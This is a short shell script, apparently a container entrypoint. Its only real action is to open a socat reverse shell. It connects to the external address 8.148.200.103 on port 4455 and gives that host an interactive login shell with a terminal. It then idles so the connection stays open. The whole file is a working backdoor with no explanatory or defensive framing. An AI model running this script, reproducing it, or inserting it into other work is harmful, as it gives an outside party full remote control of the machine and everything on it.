#!/bin/sh
(socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:8.148.200.103:4455 &)
exec tail -f /dev/null
